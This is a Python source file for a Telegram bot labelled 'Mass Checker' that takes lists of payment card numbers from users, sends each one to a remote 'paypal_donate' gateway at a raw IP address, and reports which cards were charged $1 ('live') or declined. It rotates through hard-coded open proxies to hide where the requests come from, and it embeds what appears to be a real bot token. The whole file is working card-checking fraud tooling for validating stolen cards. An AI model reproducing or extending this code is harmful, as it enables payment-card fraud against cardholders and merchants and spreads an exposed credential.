from telebot import TeleBot
import requests
import sys
import time

bot = TeleBot("8663863938:AAG9rm2FS5OpYHnRAnUql0r7oMJFyGMLwLs")

GATEWAY = "http://138.128.240.15:8025/paypal_donate?cc="

proxies_list = [
    "http://148.230.4.241:999",
    "http://2.78.60.10:3129",
    "http://1.231.81.166:3128",
    "http://45.167.124.71:999",
    "http://103.157.200.126:3128",
    "http://80.92.204.47:1081"
]

current_proxy = 0

def get_proxy():
    global current_proxy
    proxy = proxies_list[current_proxy % len(proxies_list)]
    current_proxy += 1
    print(f"[AUTO PROXY] Using: {proxy}", file=sys.stdout, flush=True)
    return {"http": proxy, "https": proxy}

@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(m.chat.id, "✅ **Mass Checker ON**\n/chk — txt file bhej")

@bot.message_handler(commands=['chk'])
def chk_file(m):
    bot.send_message(m.chat.id, "📁 Cards wali .txt file bhej (ek line mein ek card)")

@bot.message_handler(content_types=['document'])
def handle_file(m):
    if not m.document.file_name.endswith('.txt'):
        bot.reply_to(m, "Sirf .txt file bhej")
        return

    file_info = bot.get_file(m.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    cards = [line.strip() for line in downloaded.decode('utf-8').splitlines() if line.strip()]

    bot.send_message(m.chat.id, f"🔄 {len(cards)} cards check shuru...")

    live = 0
    dead = 0
    msg = bot.send_message(m.chat.id, "Processing...")

    for i, card in enumerate(cards):
        proxy = get_proxy()
        print(f"[CHECKING {i+1}/{len(cards)}] {card}", file=sys.stdout, flush=True)

        try:
            url = GATEWAY + card.replace(" ", "")
            r = requests.get(url, proxies=proxy, timeout=20)
            resp = r.text

            print(f"[RESPONSE] {resp[:200]}...", file=sys.stdout, flush=True)

            if any(x in resp.lower() for x in ["charge", "charged", "approved", "success", "live"]):
                live += 1
                bot.send_message(m.chat.id, f"✅ **1$ Charged - Card Approved**\n{card}")
            elif any(x in resp for x in ["ORDER NOT APPROVED", "DECLINED", "CARD_GENERIC_ERROR"]):
                dead += 1
                bot.send_message(m.chat.id, f"❌ **Card was got declined**\n{card}")
            else:
                dead += 1

            if i % 5 == 0:
                bot.edit_message_text(f"🔄 Checking {i+1}/{len(cards)}\n✅ Live: {live} | ❌ Dead: {dead}", m.chat.id, msg.message_id)

        except:
            dead += 1

    bot.edit_message_text(f"✅ **COMPLETE**\n✅ Live: {live}\n❌ Dead: {dead}\nTotal: {len(cards)}", m.chat.id, msg.message_id)

@bot.message_handler(func=lambda m: True)
def single_check(m):
    for line in m.text.splitlines():
        line = line.strip()
        if not line: continue
        # Single card check (same logic)
        proxy = get_proxy()
        try:
            url = GATEWAY + line.replace(" ", "")
            r = requests.get(url, proxies=proxy, timeout=20)
            resp = r.text

            if any(x in resp.lower() for x in ["charge", "charged", "approved", "success", "live"]):
                bot.reply_to(m, f"✅ **1$ Charged - Card Approved**\n{line}")
            elif any(x in resp for x in ["ORDER NOT APPROVED", "DECLINED", "CARD_GENERIC_ERROR"]):
                bot.reply_to(m, f"❌ **Card was got declined**\n{line}")
        except:
            pass

bot.infinity_polling()
